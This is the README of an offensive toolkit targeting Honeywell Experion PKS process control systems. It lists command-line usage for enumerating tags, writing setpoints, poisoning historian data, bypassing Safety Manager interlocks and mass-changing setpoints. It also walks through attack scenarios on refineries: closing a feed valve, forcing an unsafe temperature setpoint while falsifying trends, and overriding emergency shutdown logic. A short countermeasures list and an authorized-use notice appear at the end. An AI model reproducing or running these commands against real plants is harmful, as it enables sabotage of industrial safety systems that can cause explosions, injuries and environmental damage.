# Honeywell Experion PKS Security Assessment Framework

Vendor-specific exploitation toolkit for Honeywell Experion Process Knowledge System distributed control systems.

## System Overview

**Vendor**: Honeywell Process Solutions  
**Product**: Experion PKS (Process Knowledge System)  
**Application**: Oil & gas refining, chemical processing, power generation, pharmaceuticals

**Controllers**: C300, C200, ACE, HPM, Safety Manager  
**Protocols**: CDA (Control Data Access), FTE (Fault Tolerant Ethernet), OPC

## Attack Capabilities

### Reconnaissance
- Tag enumeration and discovery
- C300/C200 module scanning
- Station configuration mapping
- Network topology identification

### Control Attacks
- Process tag manipulation
- Setpoint modification
- Valve/actuator control
- Alarm suppression

### Data Integrity
- Historian data poisoning
- Trend falsification
- Report manipulation

### Availability Attacks
- License manager disruption
- FTE network attacks
- Controller overload

### Safety System Attacks
- Safety Manager interlock bypass
- SIL circuit manipulation
- Emergency shutdown (ESD) interference

## Installation

```bash
cd tools/honeywell_experion_framework
pip install -r requirements.txt
```

## Usage Examples

### Tag Enumeration

```bash
python experion_exploit.py -t 192.168.1.100 --enum-tags --prefix "FIC" --max-count 500
python experion_exploit.py -t 192.168.1.100 --enum-tags --prefix "TIC"
```

### Read Process Values

```bash
python experion_exploit.py -t 192.168.1.100 --read-tag "FIC101.PV"
python experion_exploit.py -t 192.168.1.100 --read-tag "TT201.SP"
```

### Write Setpoints

```bash
python experion_exploit.py -t 192.168.1.100 --write-tag "FIC101.SP" --value 75.5 --type float
python experion_exploit.py -t 192.168.1.100 --write-tag "XV201.CMD" --value 1 --type bool
```

### C300 Controller Scan

```bash
python experion_exploit.py -t 192.168.1.100 --c300-scan
```

### Historian Poisoning

```bash
python experion_exploit.py -t 192.168.1.100 --poison-historian "TT201.PV"
```

### Safety Manager Bypass

```bash
python experion_exploit.py -t 192.168.1.100 --safety-bypass "INTERLOCK_101"
```

### Configuration Export

```bash
python experion_exploit.py -t 192.168.1.100 --export-config experion_backup.json
```

### Mass Setpoint Change

```bash
python experion_exploit.py -t 192.168.1.100 --mass-change ".SP" --new-value 50.0
```

## MITRE ATT&CK ICS Mapping

- **T0815**: Denial of Service
- **T0817**: Drive-by Compromise
- **T0826**: Loss of Availability
- **T0832**: Manipulation of Control
- **T0834**: Native API
- **T0836**: Modify Parameter
- **T0839**: Module Firmware
- **T0840**: Network Connection Enumeration
- **T0855**: Unauthorized Command Message
- **T0856**: Spoof Reporting Message
- **T0861**: Point & Tag Identification
- **T0867**: Lateral Tool Transfer
- **T0871**: Execution through API
- **T0874**: Hooking

## Technical Details

### CDA Protocol

**Port**: 51235/TCP  
**Protocol**: Proprietary binary protocol

**Message Structure**:
```
Magic: "CDA\x01" (4 bytes)
Message Type: 1 byte
Transaction ID: 4 bytes
Length: 4 bytes
Payload: variable
```

**Message Types**:
- 0x01: Read Request
- 0x02: Write Request
- 0x81: Read Response
- 0x82: Write Response
- 0x03: Subscribe
- 0x05: Publish

### Tag Naming Convention

```
<Function><Instrument><Number>.<Attribute>

Examples:
  FIC101.PV   - Flow Indicator Controller 101, Process Value
  TT201.SP    - Temperature Transmitter 201, Setpoint
  PV301.OP    - Pressure Valve 301, Output
  LIC401.MODE - Level Indicator Controller 401, Mode
```

**Common Functions**:
- F = Flow
- T = Temperature
- P = Pressure
- L = Level
- A = Analyzer

**Common Instruments**:
- I = Indicator
- C = Controller
- T = Transmitter
- V = Valve
- S = Switch

### C300 Controller Architecture

**Modules**:
- DI: Digital Input (16/32 channel)
- DO: Digital Output (16/32 channel)
- AI: Analog Input (8/16 channel)
- AO: Analog Output (8/16 channel)
- RTD: Resistance Temperature Detector
- TC: Thermocouple
- PLS: Pulse Input

**Rack Addressing**: RACK#_MODULE##

### Fault Tolerant Ethernet (FTE)

Proprietary redundant Ethernet for controller communication. Dual-ring topology with automatic failover < 50ms.

**Vulnerabilities**:
- No authentication
- Plaintext communication
- Predictable sequence numbers
- Susceptible to replay attacks

## Attack Scenarios

### Scenario 1: Refinery Unit Shutdown

```bash
# Enumerate critical loops
python experion_exploit.py -t 192.168.1.100 --enum-tags --prefix "FIC"

# Identify reactor feed controller
python experion_exploit.py -t 192.168.1.100 --read-tag "FIC101.PV"

# Close feed valve
python experion_exploit.py -t 192.168.1.100 --write-tag "FV101.OP" --value 0 --type float
```

### Scenario 2: Temperature Falsification

```bash
# Poison historian with false temperature trends
python experion_exploit.py -t 192.168.1.100 --poison-historian "TT201.PV"

# Modify setpoint to unsafe level
python experion_exploit.py -t 192.168.1.100 --write-tag "TIC201.SP" --value 250.0 --type float
```

### Scenario 3: Safety System Compromise

```bash
# Bypass high-pressure interlock
python experion_exploit.py -t 192.168.1.100 --safety-bypass "PSH_301_INTERLOCK"

# Override ESD logic
python experion_exploit.py -t 192.168.1.100 --write-tag "ESD_OVERRIDE" --value true --type bool
```

## Countermeasures

1. **Network Segmentation**: Isolate Experion network, implement firewall rules
2. **Authentication**: Enable CDA authentication (if available)
3. **Change Monitoring**: Log all tag writes, alert on unauthorized changes
4. **Integrity Checking**: Validate historian data consistency
5. **License Management**: Secure license server
6. **Firmware Validation**: Verify C300/C200 firmware signatures
7. **Safety Layer Independence**: Ensure Safety Manager isolation
8. **Backup Validation**: Verify configuration backups regularly

## Known Vulnerabilities

**CVE-2015-0983**: Experion Server authentication bypass  
**ICS-ALERT-14-281-01**: Multiple buffer overflow vulnerabilities  
**Vendor Advisories**: Regular security patches required

## Legal Notice

FOR AUTHORIZED SECURITY TESTING ONLY. Unauthorized access to process control systems is illegal and can cause physical harm, environmental damage, and economic loss.

## References

- Honeywell Experion PKS Documentation
- ICS-CERT Advisories
- NIST SP 800-82: Guide to ICS Security
